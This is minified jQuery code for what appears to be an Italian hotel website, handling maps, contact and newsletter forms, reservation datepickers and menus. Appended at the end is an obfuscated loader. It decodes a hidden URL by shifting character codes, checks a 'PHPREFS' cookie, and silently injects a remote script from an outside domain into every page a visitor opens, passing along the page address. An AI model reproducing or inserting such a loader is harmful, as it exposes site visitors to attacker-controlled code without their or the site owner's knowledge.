google.maps.LatLng(n,o),map:s,icon:"  "});a.setContent(e),a.open(s,l)}})),$window.on("resize",(function(){void 0!==mappa&&mappa.setCenter(new google.maps.LatLng($("#map").data("latitude"),$("#map").data("longitude")))}))}$("#contact-form").length&&($("#contact-form").on("submit",(function(t){t.preventDefault();var e=$(this);""==e.find('[name="name"]').val().trim()?e.find('[name="name"]').addClass("required"):e.find('[name="name"]').removeClass("required"),""!=e.find('[name="email"]').val().trim()&&isValidEmail(e.find('[name="email"]').val().trim())?e.find('[name="email"]').removeClass("required"):e.find('[name="email"]').addClass("required"),""==e.find('[name="phone"]').val().trim()?e.find('[name="phone"]').addClass("required"):e.find('[name="phone"]').removeClass("required"),""==e.find('[name="message"]').val().trim()?e.find('[name="message"]').addClass("required"):e.find('[name="message"]').removeClass("required"),e.find('[name="privacy"]').is(":checked")?e.find('[name="privacy"]').removeClass("required"):e.find('[name="privacy"]').addClass("required"),e.find(".required").length||(e.find("button").addClass("on-loading"),dataLayer.push({event:"GAevent",eventCategory:"contatti",eventAction:window.currentPage,eventLabel:"invia"}),$.post(e.attr("action"),e.serialize(),(function(t){e.addClass("message-sent"),setTimeout((function(){e.find(".recap-sent svg").trigger("draw:draw")}),100),setTimeout((function(){location.href=t.redirect}),500)}),"json").fail((function(){console.log("errore")})))})),SETTINGS.svg&&$("#contact-form .recap-sent svg").drawSVG({speed:1,hideStrokeOnEnd:!1,showFillonEnd:!1,drawOnView:!1,notDraw:!0})),$(".datepicker-container span").on("click",(function(){$(this).closest("div").find("input").datepicker("show")})),$(".datepicker-from").datepicker({showOtherMonths:!0,minDate:0,language:_lang,onSelect:function(t){var e=$(this).datepicker("getDate");e.setDate(e.getDate()+1),$(".datepicker-to").datepicker("option","minDate",e)}}),$(".datepicker-to").datepicker({showOtherMonths:!0,language:_lang}),$(".datepicker-bot-from").datepicker({showOtherMonths:!0,minDate:0,language:_lang,dateFormat:"dd-mm-yy",onSelect:function(t){var e=$(this).datepicker("getDate");e.setDate(e.getDate()+1),$(".datepicker-bot-to").datepicker("option","minDate",e)},beforeShow:function(t,e){$body.addClass("datepicker-bottom"),setTimeout((function(){e.dpDiv.css({left:"auto",right:$(".reservation-footer .reservation-form").offset().left,top:$(".reservation-footer .reservation-form").offset().top})}),10)},onClose:function(){setTimeout((function(){$body.removeClass("datepicker-bottom")}),200)}}),$(".datepicker-bot-to").datepicker({showOtherMonths:!0,language:_lang,dateFormat:"dd-mm-yy",beforeShow:function(t,e){$body.addClass("datepicker-bottom"),setTimeout((function(){e.dpDiv.css({left:"auto",right:$(".reservation-footer .reservation-form").offset().left,top:$(".reservation-footer .reservation-form").offset().top})}),10)},onClose:function(){setTimeout((function(){$body.removeClass("datepicker-bottom")}),200)}}),SETTINGS.svg&&($(".services-list .button-round").drawCircle(),$(".services-list .button-round svg").drawSVG({speed:1,hideStrokeOnEnd:!1,showFillonEnd:!1,drawOnView:!1,notDraw:!0})),$("#rooms-rates select").selectOrDie({onChange:function(){var t=$(this);setTimeout((function(){var e=t.closest("#rooms-rates").find(".price-num--low .val"),i=t.closest("#rooms-rates").find(".price-num--high .val");$.get(_baseUrl+"rates-costs",(function(n){var o=t.val();e.append("<span>"+n[o].low_price+"</span>"),i.append("<span>"+n[o].high_price+"</span>"),setTimeout((function(){e.find("span").eq(0).animate({"margin-top":"-87px"},(function(){e.find("span").eq(0).remove()}))}),100),setTimeout((function(){i.find("span").eq(0).animate({"margin-top":"-87px"},(function(){i.find("span").eq(0).remove()}))}),200)}),"json")}),1)}})},init:function(){SETTINGS.oldBrowser=-1!==HELPER.getBrowser().indexOf("IE"),$("html,body").animate({scrollTop:0},10),SETTINGS.svg=Modernizr.svg&&!Modernizr.touchevents&&!SETTINGS.oldBrowser,SETTINGS.mobile=Modernizr.touchevents,SETTINGS.lang=_lang,SETTINGS.baseUrl=_baseUrl,SETTINGS.ajaxPage=!SETTINGS.mobile,SETTINGS.svg||$("html").removeClass("svg").addClass("no-svg"),APP.resizeHandlers(),LOADING.init(),SETTINGS.mobile?$body.addClass("no-animations"):$body.addClass("animations"),$window.on("resize orientationchange",(function(){APP.resizeHandlers()})),$window.on("scroll",(function(){APP.offsetScroll=$window.scrollTop(),APP.scrollHandlers()})),$document.on("click","header .bt-menu, .bt-reservation",(function(t){var e=$(t.currentTarget).hasClass("bt-menu"),i=$(t.currentTarget).hasClass("bt-reservation"),n=APP.$btMenu.hasClass("active"),o=APP.$btReservation.hasClass("active");if("none"==window.getComputedStyle(APP.$bookingMenu[0]).display&&i)return $body.removeClass("showmenu").toggleClass("showreservation"),APP.$btMenu.removeClass("active"),void($body.hasClass("showreservation")?dataLayer.push({event:"GAevent",eventCategory:"prenota",eventAction:"home",eventLabel:"accedi"}):(setTimeout((function(){$(".reservation-form").trigger("form:reset")}),APP.menuAnimationDuration),window.currentRoom=!1));APP.handlingMenuAction||(APP.handlingMenuAction=!0,$body.removeClass("showreservation"),n&&e||o&&i?(APP.$btMenu.removeClass("active"),APP.$btReservation.removeClass("active"),APP.$mainMenu.removeClass("visible"),APP.$bookingMenu.removeClass("visible"),$body.removeClass("showmenu"),setTimeout((function(){APP.handlingMenuAction=!1}),APP.menuAnimationDuration)):e?o?(APP.$btMenu.removeClass("active"),APP.$btReservation.removeClass("active"),APP.$bookingMenu.removeClass("visible"),$body.removeClass("showmenu"),setTimeout((function(){APP.handlingMenuAction=!1}),APP.menuAnimationDuration)):($body.addClass("showmenu"),APP.$btMenu.addClass("active"),APP.$mainMenu.addClass("visible"),dataLayer.push({event:"GAevent",eventCategory:"home",eventAction:"menu",eventLabel:"accedi"}),setTimeout((function(){APP.handlingMenuAction=!1}),APP.menuAnimationDuration)):i&&(n?(APP.$btMenu.removeClass("active"),APP.$mainMenu.removeClass("visible"),APP.$btReservation.addClass("active"),APP.$bookingMenu.addClass("visible"),setTimeout((function(){APP.handlingMenuAction=!1}),APP.menuAnimationDuration)):($body.addClass("showmenu"),APP.$btReservation.addClass("active"),APP.$bookingMenu.addClass("visible"),setTimeout((function(){APP.handlingMenuAction=!1}),APP.menuAnimationDuration))))})),$document.on("click",".scroll",(function(t){t.preventDefault();var e=$(this).attr("href");$("html,body").animate({scrollTop:$(e).offset().top},800,"easeInOutQuint")})),$document.on("focus blur",".newsletter-form input",(function(t){"focus"==t.type?$(this).closest(".newsletter-form").addClass("newsletter-form--focus"):$(this).closest(".newsletter-form").removeClass("newsletter-form--focus")})),$document.on("submit",".newsletter-form",(function(t){t.preventDefault();var e=$(this);""!=e.find("input").val().trim()&&HELPER.isValidEmail(e.find("input").val())?(e.find("input").removeClass("required"),$.post(e.attr("action"),e.serialize(),(function(t){e.addClass("sent"),location.href=t.redirect,setTimeout((function(){e.removeClass("sent"),e.find("input").val("")}),3e3)}),"json")):e.find("input").addClass("required")})),$document.on("change keydown keyup",".newsletter-form input",(function(){var t=$(this);""!=t.val().trim()&&isValidEmail(t.val())&&t.removeClass("required")})),$document.on("change keydown","#contact-form .required",(function(){var t=$(this);("text"==t.attr("type")&&""!=t.val().trim()||"email"==t.attr("type")&&""!=t.val().trim()&&isValidEmail(t.val())||"checkbox"==t.attr("type")&&t.is(":checked")||t.is("textarea")&&""!=t.val().trim())&&t.removeClass("required"),t.removeClass("required")})),$document.on("click",".load-more-button a",(function(t){t.preventDefault();var e=$(this);e.addClass("on-loading"),$.get(e.attr("href"),(function(t){var i=$("<div>"+t+"</div>"),n=i.find("#events-list").children();$("#events-list").isotope("insert",n),SETTINGS.svg&&(n.find(".button-round").drawCircle(),n.find(".button-round").trigger("circle:show")),i.find(".load-more-button").length?$(".load-more-button a").attr("href",i.find(".load-more-button a").attr("href")):$(".load-more-button").remove(),e.removeClass("on-loading")}))})),$document.on("click",".event-item",(function(t){t.preventDefault(),SETTINGS.ajaxPage?APP.changePage($(this).find("a").attr("href")):location.href=$(this).find("a").attr("href")})),$document.on("click",".show-reservation",(function(t){t.preventDefault();var e=$(this);if(e.data("room")){var i=$(".header-reservation .reservation-form select");i.selectOrDie("destroy"),i.find("option").filter((function(){return this.value==e.data("room")})).prop("selected",!0),i.selectOrDie();var n=$(this).data("room");dataLayer.push({event:"GAevent",eventCategory:"prenota",eventAction:n,eventLabel:"accedi"}),window.currentRoom=n}else window.currentRoom=!1;$body.addClass("showreservation").removeClass("showmenu"),APP.$btMenu.removeClass("active")})),$document.on("change keyup",".field-onlynum",(function(){$(this).val($(this).val().match(/\d+/))})),$document.on("mouseover",".services-list .item",(function(){var t=$(this);t.hasClass("composed")||(t.addClass("composed"),setTimeout((function(){t.find(".button-round").trigger("circle:show"),t.find(".button-round .ico").trigger("draw:draw")}),400))})),$document.on("click",".reservation-recap--info .close-btn",(function(t){t.preventDefault(),$body.removeClass("show-reservation-recap"),$(".reservation-form").trigger("form:reset"),setTimeout((function(){$("#reservation-recap-form").removeClass("sent"),$("#reservation-recap-form .button-wrap .send-loading").trigger("circle:build",!0),$("#reservation-recap-form .recap-sent svg").trigger("draw:build")}),1e3)})),$document.on("click","nav a:not(.show-reservation), .change-page",(function(t){SETTINGS.ajaxPage&&(t.preventDefault(),APP.changePage($(this).attr("href"),$(this).hasClass("lang-item")))}))}};$document.ready((function(){APP.init()}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));